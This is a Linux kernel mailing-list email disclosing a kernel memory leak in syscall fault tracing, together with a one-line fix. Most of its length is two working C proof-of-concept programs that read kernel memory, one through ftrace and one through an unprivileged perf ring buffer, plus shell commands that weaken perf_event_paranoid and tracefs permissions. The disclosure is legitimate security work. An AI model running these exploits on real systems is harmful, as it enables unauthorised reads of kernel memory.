Received: from mail-pg1-f175.google.com (mail-pg1-f175.google.com [209.85.215.175])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3C5225187E0
	for <linux-trace-kernel@vger.kernel.org>; Thu, 15 Oct 2026 12:06:03 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.175
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1792065966; cv=none; b=F5/vsR+VdFR6FhgE9lLGgBQyh77ID9I0DB8wgaJYqv/2B7MVfGkxqbximAe0xUkLyiMinjJUCwWwOOBcQpTSYl3ZXBUCmnJMN13bdfx9LLQINNt/jCxwlUd5TTnSkTy8ryKlp1JbX+VPUmINtjgd33G41IojJT85oUkn4pERRSU=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1792065966; c=relaxed/simple;
	bh=4Aj6gibeSKtNdp1m+FnUSl58bmKGZaNDbyCxuWtkMgE=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=NvZwf6/U7f1nwQC6xIpKwY3tYU9bvWa6MUGqJaLnW/m72x+b06cd1wFJXUPEylBgugEnaUypxRXdT5bRWe3YWOhPghmvMsvq1bhHVmnE90fNptP/iOCqGO5uUahd3XBwL74//JSbULBQnBuFE3CRoLILl6HuHszti8ftFYuEvSc=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=Wgs2deJG; arc=none smtp.client-ip=209.85.215.175
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="Wgs2deJG"
Received: by mail-pg1-f175.google.com with SMTP id 41be03b00d2f7-cd5e6f0a22bso1035888a12.1
        for <linux-trace-kernel@vger.kernel.org>; Thu, 15 Oct 2026 05:06:03 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1792065963; x=1792670763; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:in-reply-to:autocrypt:from
         :references:cc:to:subject:user-agent:mime-version:date:message-id
         :from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=yjNHbIm0QgKvir0tOtLT3E9Xpde+FNS55nL7gREVQI0=;
        b=Wgs2deJGOfAkBNfTuQvhS+4FSXo276pIDwuG0eIjCmHhBprK5aOAKIprI7R9XvakG+
         XAxrjqkzDLENM/eQuGCJuTT08gcrHm9PWb879y5JVSRLxP84tCJILPi3ZO/Q8deEhO/i
         ka12JRfIpmDSaG+lNdQz0xd9A78OI2JxJmSaxHqFcY8C6gQbdbtLY2n3OkcNce8t/NZ7
         IMVlYl6lY5G5oklbcZActTNZmKkMuT/gCBaU5xzq12LLx3xaJKTSCH9YlkQYYUvK12Bg
         +SD8giob/1O8LEXEF5S8UikCUtgZtPnHYtJUvbBiRASpX7mWxnv2e0h3lZNyZcyCRBeS
         MQfw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792065963; x=1792670763;
        h=content-transfer-encoding:content-type:in-reply-to:autocrypt:from
         :references:cc:to:subject:user-agent:mime-version:date:message-id
         :x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to:content-type;
        bh=yjNHbIm0QgKvir0tOtLT3E9Xpde+FNS55nL7gREVQI0=;
        b=HwBPAr3LXlnrbcHgEjNEN1otUSib7CUV+6guJqnuTwbZGhG9KSx261idP3PafBvvnv
         p9ayZad+f44qnWoe49hlY8ih7y2Qtdec0iOh/mg8PKswFIck+uSnhEyKsqIViy/+rgra
         pyY8zFfwmWMXNH3A6u+3JlMmJKdXgYsboGSo1hGcPEwmEgoBoEtfmV5SGtfX7Gw/LpvV
         K91MMQ7niaPsoHDO2vbqZG98dg2Z4JmPbjqbL2MhU6RxW0TZSfOMhwe8oEdEQiRrabXE
         cRZD1J7CPIT+GooGMXmXSrXY9rxGyXnLP4e5HBmvBheSB/Lh9wEoQqAEAj7aRWCRsIVq
         cCZQ==
X-Forwarded-Encrypted: i=1; AKwUvBzp2jyInDRQYhwZutNiBVkPlXlNXoKVjyD41jCTD7YwtGi+EB+PnWUhe7VTrhJRrrWH/C26CvroAQrQ+V7jtmL/NWU=@vger.kernel.org
X-Gm-Message-State: AFq9FYJrSEjTDUX8p72niqK38W6zwBO4usfj1cPpC6DTlUuO/Ku7I+94
	YqPLUpDOF0Bb6deR40k3b3GUjWKYutR1VWYShA6J8RuUO1LtdTQK+YiU
X-Gm-Gg: AYBFou2j/x8bdqA8MUqZdjRYmiFr0m9oqnTlFeXa+PN2q9Ora66C2xq8+GleIA84cp8
	M/xktm1TXDJFh/m22YfTrdzGrxux1fiLGuaAtr4dHF/9G0M9ixT9EdNtdWbPsQshl4/RR7RKAk2
	14p1DCglDbueItS3S2ZMf8y3nS09MCOKtcwGeTS2/85CUNV6oei1WMjaFyiYntHyL8uVsm6iWbJ
	RAHZXldL2n0Ki2q5v65gwYHvm23c4GbOBvc8vMjmPvl4Hp3bMNVFs3W5g3kVjlnti0SwsePptXM
	HhZKe6FC4W1403oYc1C+hROXbH+zzjy25oZwioU634e0rFl726GunwkcD+mHF31xxLSR8H67dJD
	txXetmO7P7qQJt0fJ4NHsSsKxUs3MRMtMTOLhV79WHGGh13+GdAv+oaD9gI0nyVCv8bbellIt6J
	0oBvEAkCzj4AtN0jw+V6ebfI8WPf33ysKVMqNytamTL3KlCAYw5dFux6oUlishOpD5ulc/c57uW
	EB4ns8kmCF3VM5hbg==
X-Received: by 2002:a17:90b:2d86:b0:3ab:33b6:2c27 with SMTP id 98e67ed59e1d1-3ab3a747d2fmr16433734a91.23.1792065962390;
        Thu, 15 Oct 2026 05:06:02 -0700 (PDT)
Received: from [58.206.203.66] ([58.206.203.66])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3ac9b5f2447sm1861936a91.2.2026.10.15.05.05.59
        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
        Thu, 15 Oct 2026 05:06:01 -0700 (PDT)
Message-ID: <b2dd26de-efd0-4b8d-8086-ee5878a5703f@gmail.com>
Date: Thu, 15 Oct 2026 20:05:57 +0800
Precedence: bulk
X-Mailing-List: linux-trace-kernel@vger.kernel.org
List-Id: <linux-trace-kernel.vger.kernel.org>
List-Subscribe: <mailto:linux-trace-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-trace-kernel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [BUG] tracing: __copy_from_user without access_ok leaks kernel
 memory in syscall fault tracing
To: Greg KH <gregkh@linuxfoundation.org>
Cc: rostedt@goodmis.org, mhiramat@kernel.org, linux-kernel@vger.kernel.org,
 linux-trace-kernel@vger.kernel.org, mathieu.desnoyers@efficios.com,
 security@kernel.org
References: <6ad07a3c.6e2bf4e6.f29cc.dd67@mx.google.com>
 <2026101539-rinse-refocus-8203@gregkh>
From: Wang Haoran <haoranwangsec@gmail.com>
Autocrypt: addr=haoranwangsec@gmail.com; keydata=
 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
 HMFw55yeFcjSzQ==
In-Reply-To: <2026101539-rinse-refocus-8203@gregkh>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

 From ca4e2a6928bbd9010ebec967440517b08909b992 Mon Sep 17 00:00:00 2001
From: Haoran Wang <haoranwangsec@gmail.com>
Date: Thu, 15 Oct 2026 19:12:21 +0800
Subject: [PATCH] tracing/syscalls: use copy_from_user for the faultable
  syscall buffer

Here is a working fix for the report. The leak is not strictly root
only, so there is a security concern on systems that relax
perf_event_paranoid.

syscall_copy_user_array() copies the raw buffer argument of faultable
syscalls such as write and pwrite64 with __copy_from_user, which skips
the access_ok check. A traced process that calls write(fd, kernel_addr,
count) therefore has up to SYSCALL_FAULT_USER_MAX bytes of kernel
memory copied into the sys_enter trace record at the tracepoint, before
vfs_write performs its own access_ok and returns EFAULT.

The copied bytes reach two buffers. The ftrace path stores them in the
ftrace ring buffer, which only root can read because tracefs is root
only by default. The perf path stores them in the perf ring buffer of
the process that owns the tracepoint event, which a non root process
can mmap for its own event. That perf path is gated only by
perf_allow_tracepoint, which a zero capability user passes when
perf_event_paranoid is set to -1. At that same setting
kallsyms_show_value also exposes kernel addresses to non root users
through /proc/kallsyms, so on systems that relax perf_event_paranoid
the leak becomes an unprivileged kernel memory read into the attacker's
own ring buffer.

Use copy_from_user instead so an address outside the user range is
rejected by access_ok and the entry is recorded as faulted, with no
kernel memory entering the trace record.

Full analysis and both reproducers (the ftrace path and the perf path)
are below.

Signed-off-by: Haoran Wang <haoranwangsec@gmail.com>
---

I'd like to report an issue in kernel/trace/trace_syscalls.c:686 (function
syscall_copy_user_array), found via static analysis of Linux 7.0.11 and
verified against the 7.2.10 source tree. I have reproduced the leak on an
7.2.10 kernel.

1. Summary
The "syscall fault tracing" feature (added in 7.0, CONFIG_FTRACE_SYSCALLS)
treats the raw syscall argument args[1] (the buffer pointer) of faultable
syscalls (write/pwrite64/ mq_timedsend) as a user address and copies it
with __copy_from_user(buf, args[1], size) without an access_ok() check.
When a traced process calls write(fd, <kernel address>, count), the
sys_enter tracepoint fires before vfs_write's access_ok and
__copy_from_user copies up to 165 bytes from that kernel address into the
per-CPU trace buffer, which is appended to the sys_enter_write event and
readable from /sys/kernel/tracing/trace. The write() itself then returns
EFAULT, but the leak is already complete. copy_from_user() would have
rejected a kernel address via access_ok(); __copy_from_user() does not.

2. Vulnerable code
- File: kernel/trace/trace_syscalls.c:686 (Linux 7.0.11; :685 in 7.2.10)
- Function: syscall_copy_user_array
- Misused API: __copy_from_user

```c
/* syscall_copy_user_array() - syscall fault tracing */
__copy_from_user(buf, ptr, size);   /* ptr = args[1] (raw syscall buffer 
arg), no access_ok() */
```

3. Root cause
__copy_from_user() is the access_ok()-skipping variant of
copy_from_user(). The syscall fault tracing feature marks
write/pwrite64/mq_timedsend as faultable: check_faultable_syscall() sets
user_mask = BIT(1) (the buffer argument) and user_arg_size = 2 (the count
argument). When such a syscall is ftrace-traced, sys_fault_user() takes
the syscall's *raw* argument args[1] (the buffer-pointer register value)
as a user address and, via syscall_copy_user_array(), calls
__copy_from_user(buf, args[1], size) with no access_ok(). Because args[1]
is the raw register value captured at the sys_enter tracepoint (before
vfs_write performs its own access_ok on the buffer), a traced process can
supply a kernel address there; __copy_from_user dereferences it directly
and copies up to SYSCALL_FAULT_USER_MAX (165) bytes of kernel memory into
the per-CPU trace buffer. The content appears in the sys_enter_write trace
event and is readable from /sys/kernel/tracing/trace. The actual write()
then fails with EFAULT (vfs_write's access_ok rejects the kernel address),
but the leak has already happened in the tracepoint.

This differs from the trace.c:6836 site (tracing_mark_write), where the
VFS layer's access_ok (vfs_write at fs/read_write.c:676) guards the buffer
before the ftrace .write handler runs. Here the leak happens at the
sys_enter tracepoint, which fires *before* vfs_write's access_ok, so there
is no upstream guard on args[1].

4. Affected versions
Present in: Linux 7.0.11. 7.2.10: still present, unfixed -- reproduced on
an 7.2.10 kernel.

5. Trigger / Preconditions
root / CAP_SYS_ADMIN / CAP_PERFMON (needed to enable syscall tracing via
tracefs; on the test machine /proc/sys/kernel/perf_event_paranoid = 2 and
tracefs is root-writable), plus CONFIG_FTRACE_SYSCALLS. The traced process
calls write(fd, <kernel address>, count) while sys_enter_write tracing is
enabled.

6. Proof of Concept
Reproduced on a pristine Linux 7.2.10 kernel
(CONFIG_FTRACE_SYSCALLS=y, config-only). The traced process calls
write(devnull, linux_banner_addr, 200), the sys_enter_write trace event
then contains the leaked linux_banner string.

Concrete reproduced evidence (version 7.2.10):
- The sys_enter_write trace event contains the leaked linux_banner hex
   blob and ASCII string; decoding matches /proc/version.
- Decoded leaked content begins: "Linux version 7.2.10 (root@xxx) (gcc
   (Ubuntu 15.2.0-16ubuntu1) ...", which exactly matches /proc/version on
   the test kernel.
- write() itself returns EFAULT (vfs_write access_ok rejects the kernel
   address), but the kernel-memory copy into the trace buffer has already
   completed in the sys_enter tracepoint.

```c
/*
  *
  * Build: gcc -O2 -o poc_syscall_fault_leak poc_syscall_fault_leak.c
  * Run:   sudo ./poc_syscall_fault_leak
  */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <stdint.h>

#define TRACEFS "/sys/kernel/tracing"
#define EVT     TRACEFS "/events/syscalls/sys_enter_write"

static int write_file(const char *path, const char *val)
{
     int fd = open(path, O_WRONLY);
     if (fd < 0)
         return -1;
     if (write(fd, val, strlen(val)) < 0) {
         close(fd);
         return -1;
     }
     close(fd);
     return 0;
}

static unsigned long lookup_sym(const char *sym)
{
     FILE *f = fopen("/proc/kallsyms", "r");
     if (!f)
         return 0;
     char line[256], name[128];
     unsigned long a;
     char t;
     while (fgets(line, sizeof(line), f))
         if (sscanf(line, "%lx %c %127s", &a, &t, name) == 3 && a && 
!strcmp(name, sym)) {
             fclose(f);
             return a;
         }
     fclose(f);
     return 0;
}

static char *read_file(const char *path, char *buf, size_t cap)
{
     int fd = open(path, O_RDONLY);
     if (fd < 0)
         return NULL;
     size_t total = 0;
     ssize_t n;
     while (total < cap - 1 && (n = read(fd, buf + total, cap - 1 - 
total)) > 0)
         total += n;
     buf[total] = 0;
     close(fd);
     return buf;
}

int main(void)
{
     if (getuid() != 0) {
         fprintf(stderr, "[-] must run as root (tracefs is root-only, 
perf_event_paranoid=2)\n");
         return 1;
     }

     unsigned long kaddr = lookup_sym("linux_banner");
     if (!kaddr) {
         fprintf(stderr, "[-] cannot resolve linux_banner from 
/proc/kallsyms\n");
         return 1;
     }
     printf("[+] target: linux_banner @ 0x%lx\n", kaddr);
     printf("[+]   (kernel string: \"Linux version 7.x (root@...) 
...\")\n");
     printf("[+] vuln site: trace_syscalls.c:686 syscall_copy_user_array 
-> __copy_from_user (no access_ok)\n\n");

     int devnull = open("/dev/null", O_WRONLY);
     if (devnull < 0) {
         perror("open /dev/null");
         return 1;
     }

     if (access(EVT "/enable", W_OK) != 0) {
         fprintf(stderr, "[-] %s/enable not writable (%s)\n", EVT, 
strerror(errno));
         fprintf(stderr, "    -> CONFIG_FTRACE_SYSCALLS off, or tracefs 
not mounted\n");
         return 1;
     }

     write_file(TRACEFS "/trace", "\n");

     int pipefd[2];
     if (pipe(pipefd) < 0) {
         perror("pipe");
         return 1;
     }

     pid_t child = fork();
     if (child < 0) {
         perror("fork");
         return 1;
     }
     if (child == 0) {
         close(pipefd[1]);
         char c;
         read(pipefd[0], &c, 1);    /* wait until parent finished 
enabling */
         close(pipefd[0]);
         /*
          * THE TRIGGER: write(fd, KERNEL_ADDR, 200).
          * The buf argument is a kernel address. The sys_enter tracepoint
          * fires before vfs_write's access_ok, and __copy_from_user copies
          * directly from that kernel address -> kernel memory enters 
the trace.
          * write() then returns EFAULT, but the leak is already complete.
          */
         syscall(__NR_write, devnull, (void *)kaddr, 200);
         _exit(0);
     }
     close(pipefd[0]);

     char filter[64];
     snprintf(filter, sizeof(filter), "common_pid == %d", child);
     if (write_file(EVT "/filter", filter) < 0)
         fprintf(stderr, "[!] set filter failed: %s\n", strerror(errno));

     if (write_file(EVT "/enable", "1") < 0)
         fprintf(stderr, "[!] enable event failed: %s\n", strerror(errno));

     write(pipefd[1], "x", 1);
     close(pipefd[1]);
     waitpid(child, NULL, 0);

     write_file(EVT "/enable", "0");
     write_file(EVT "/filter", "0");

     char buf[65536];
     if (!read_file(TRACEFS "/trace", buf, sizeof(buf))) {
         fprintf(stderr, "[-] cannot read trace\n");
         return 1;
     }

     char *line = strstr(buf, "write(fd:");
     if (!line) {
         printf("[-] no sys_enter_write event captured.\n");
         printf("--- trace dump ---\n%s\n", buf);
         return 1;
     }
     char *eol = strchr(line, '\n');
     if (eol)
         *eol = 0;

     printf("[+] captured sys_enter_write event:\n    %s\n\n", line);

     if (strstr(line, "Linux version")) {
         printf("[!] 
============================================================\n");
         printf("[!] KERNEL MEMORY LEAK CONFIRMED at 
trace_syscalls.c:686\n");
         printf("[!] trace event contains the kernel banner string,\n");
         printf("[!] read from 0x%lx via __copy_from_user() WITHOUT 
access_ok()\n", kaddr);
         printf("[!] 
============================================================\n");
         return 0;
     }

     char *q1 = strchr(line, '"');
     if (q1) {
         char *q2 = strrchr(line, '"');
         if (q2 > q1) {
             printf("[!] leaked ASCII segment: \"%.*s\"\n", (int)(q2 - 
q1 - 1), q1 + 1);
             if (strstr(q1, "Linux") || strstr(q1, "version")) {
                 printf("[!] KERNEL MEMORY LEAK CONFIRMED\n");
                 return 0;
             }
         }
     }
     printf("[?] no recognizable kernel string - inspect the hex blob in 
the event line above.\n");
     return 2;
}
```

7. Impact
Kernel memory information leak: up to 165 bytes per faultable-syscall
invocation via __copy_from_user() with no access_ok(), readable from
/sys/kernel/tracing/trace.

Please let me know if you need more detail.

Best regards,
Haoran Wang <haoranwangsec@gmail.com>

Appendix: perf path reproducer
The reproducer below exercises the perf path. The leaked bytes land in
the caller's own perf ring buffer, which a non root process can mmap
for its own tracepoint event, so the result is readable with no
privilege beyond opening the event. Run it after relaxing
perf_event_paranoid and exposing tracefs as shown in the header
comment.

Verified on a 7.2.10 kernel: a process dropped to uid 1000 with zero
capabilities, with perf_event_paranoid = -1 and tracefs exposed, opens
the sys_enter_write perf event, triggers write(fd, linux_banner, 200),
and reads "Linux version 7.2.10 ..." from its own perf ring buffer,
while write() returns EFAULT.

```c
/*
  * perf_syscall_fault_leak.c
  *
  * Reproducer for the PERF path of the syscall fault tracing leak.
  *
  * The sys_enter_write tracepoint is opened as a perf event on the
  * calling process. write(fd, <kernel addr>, count) then fires that
  * tracepoint before vfs_write performs access_ok, and
  * syscall_copy_user_array() copies kernel memory into the perf record
  * with __copy_from_user. The record lands in the caller's own perf
  * ring buffer, which the process mmaps for its own event, so the
  * leaked bytes are readable with no privilege beyond opening the event.
  *
  * Build: gcc -O2 -o perf_syscall_fault_leak perf_syscall_fault_leak.c
  *
  * Unprivileged case (the escalation this path enables):
  *   # echo -1 > /proc/sys/kernel/perf_event_paranoid
  *   # mount -o remount,mode=0755 /sys/kernel/tracing
  *   # ./perf_syscall_fault_leak        # drops to uid 1000 internally
  *
  * The output ring is the process own mmap buffer, not
  * /sys/kernel/tracing/trace, so no root is needed to read the result.
  */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>

static long perf_open(struct perf_event_attr *a, pid_t p, int c, int g, 
unsigned long f)
{
     return syscall(__NR_perf_event_open, a, p, c, g, f);
}

static int drop_to_user(uid_t u)
{
     if (setresgid(u, u, u) < 0 || setresuid(u, u, u) < 0) {
         perror("setresuid");
         return -1;
     }
     return 0;
}

static unsigned long read_tracepoint_id(void)
{
     int fd = 
open("/sys/kernel/tracing/events/syscalls/sys_enter_write/id", O_RDONLY);
     if (fd < 0)
         return 0;
     char b[32];
     int n = read(fd, b, sizeof(b) - 1);
     close(fd);
     if (n <= 0)
         return 0;
     b[n] = 0;
     return strtoul(b, 0, 10);
}

static unsigned long lookup_sym(const char *sym)
{
     FILE *f = fopen("/proc/kallsyms", "r");
     if (!f)
         return 0;
     char line[256], nm[128];
     unsigned long a;
     char t;
     while (fgets(line, sizeof(line), f))
         if (sscanf(line, "%lx %c %127s", &a, &t, nm) == 3 && a && 
!strcmp(nm, sym)) {
             fclose(f);
             return a;
         }
     fclose(f);
     return 0;
}

int main(void)
{
     if (geteuid() == 0) {
         printf("[*] started as root, dropping to uid 1000 to exercise 
the unprivileged path\n");
         if (drop_to_user(1000) < 0)
             return 1;
     }
     printf("[*] running as uid=%d euid=%d\n", getuid(), geteuid());

     unsigned long id = read_tracepoint_id();
     if (!id) {
         fprintf(stderr, "[-] cannot read the sys_enter_write tracepoint 
id from tracefs\n");
         fprintf(stderr, "    (tracefs is root only by default; expose 
it to read the id)\n");
         return 1;
     }

     unsigned long kaddr = lookup_sym("linux_banner");
     if (!kaddr) {
         fprintf(stderr, "[-] cannot resolve linux_banner from 
/proc/kallsyms\n");
         fprintf(stderr, "    (hidden unless perf_event_paranoid <= 1 
with kptr_restrict = 0)\n");
         return 1;
     }

     printf("[+] sys_enter_write tracepoint id = %lu\n", id);
     printf("[+] target linux_banner @ 0x%lx\n", kaddr);

     struct perf_event_attr attr;
     memset(&attr, 0, sizeof(attr));
     attr.size = sizeof(attr);
     attr.type = PERF_TYPE_TRACEPOINT;
     attr.config = id;
     attr.sample_period = 1;
     attr.sample_type = PERF_SAMPLE_RAW;
     attr.wakeup_events = 1;

     int pfd = -1, saved = 0, cpu_used = -2;
     for (int cpu = -1; cpu < 4 && pfd < 0; cpu++) {
         errno = 0;
         pfd = (int)perf_open(&attr, 0, cpu, -1, 0);
         saved = errno;
         if (pfd >= 0) {
             cpu_used = cpu;
             break;
         }
         if (saved == EPERM || saved == EACCES)
             break;
     }
     if (pfd < 0) {
         fprintf(stderr, "[-] perf_event_open failed: %s (errno=%d)\n", 
strerror(saved), saved);
         fprintf(stderr, "    (needs perf_event_paranoid = -1 or 
CAP_PERFMON/CAP_SYS_ADMIN)\n");
         return 1;
     }
     printf("[+] perf_event_open ok, fd=%d, cpu=%d (no capability 
used)\n", pfd, cpu_used);

     int ps = sysconf(_SC_PAGESIZE);
     int npages = 64;
     size_t mapsize = (size_t)(npages + 1) * ps;
     void *base = mmap(NULL, mapsize, PROT_READ | PROT_WRITE, 
MAP_SHARED, pfd, 0);
     if (base == MAP_FAILED) {
         perror("mmap");
         return 1;
     }
     struct perf_event_mmap_page *pc = base;
     ioctl(pfd, PERF_EVENT_IOC_ENABLE, 0);

     int devnull = open("/dev/null", O_WRONLY);
     if (devnull < 0) {
         perror("open /dev/null");
         return 1;
     }

     printf("[+] triggering write(fd, 0x%lx, 200) ...\n", kaddr);
     long wr = syscall(__NR_write, devnull, (void *)kaddr, 200);
     printf("[+] write() returned %ld, errno=%d (%s)\n", wr, errno,
         wr < 0 ? "vfs_write rejected the kernel addr, but the 
tracepoint copy already happened" : "");
     close(devnull);

     int found = 0;
     for (int iter = 0; iter < 400 && !found; iter++) {
         __sync_synchronize();
         unsigned long head = pc->data_head;
         unsigned long tail = pc->data_tail;
         if (head == tail) {
             usleep(1000);
             continue;
         }
         unsigned char *data = (unsigned char *)base + ps;
         size_t dsize = (size_t)npages * ps;
         unsigned char *hit = memmem(data, dsize, "Linux version", 13);
         if (hit) {
             found = 1;
             printf("[!] LEAK CONFIRMED in the perf ring buffer:\n   ");
             for (int i = 0; i < 96; i++)
                 putchar(isprint(hit[i]) ? hit[i] : '.');
             printf("\n");
         }
         __sync_synchronize();
         pc->data_tail = head;
     }

     if (!found)
         printf("[-] no 'Linux version' in the perf ring buffer\n");

     munmap(base, mapsize);
     close(pfd);
     return found ? 0 : 1;
}
```
---
  kernel/trace/trace_syscalls.c | 2 +-
  1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/kernel/trace/trace_syscalls.c b/kernel/trace/trace_syscalls.c
index 8a4f3c7..6406123 100644
--- a/kernel/trace/trace_syscalls.c
+++ b/kernel/trace/trace_syscalls.c
@@ -682,7 +682,7 @@ static int syscall_copy_user_array(char *buf, const 
char __user *ptr,

      for (int i = 0; i < args->uargs; i++, buf += SYSCALL_FAULT_ARG_SZ) {
          ptr = (char __user *)args->ptr_array[i];
-        ret = __copy_from_user(buf, ptr, size);
+        ret = copy_from_user(buf, ptr, size);
          args->read[i] = ret ? -1 : size;
      }
      return 0;
-- 
2.43.0


在 2026/10/15 16:44, Greg KH 写道:
> On Thu, Oct 15, 2026 at 03:01:08PM +0800, Haoran Wang wrote:
>> I'd like to report an issue in kernel/trace/trace_syscalls.c:686 (function
>> syscall_copy_user_array), found via static analysis of Linux 7.0.11 and
>> verified against the 7.2.10 source tree. I have reproduced the leak on an
>> 7.2.10 kernel.
> Cool, but you forgot to also provide a working patch for this?
>
>> 1. Summary
>> The "syscall fault tracing" feature (added in 7.0, CONFIG_FTRACE_SYSCALLS)
>> treats the raw syscall argument args[1] (the buffer pointer) of faultable
>> syscalls (write/pwrite64/ mq_timedsend) as a user address and copies it
>> with __copy_from_user(buf, args[1], size) without an access_ok() check.
>> When a traced process calls write(fd, <kernel address>, count), the
>> sys_enter tracepoint fires before vfs_write's access_ok and
>> __copy_from_user copies up to 165 bytes from that kernel address into the
>> per-CPU trace buffer, which is appended to the sys_enter_write event and
>> readable from /sys/kernel/tracing/trace. The write() itself then returns
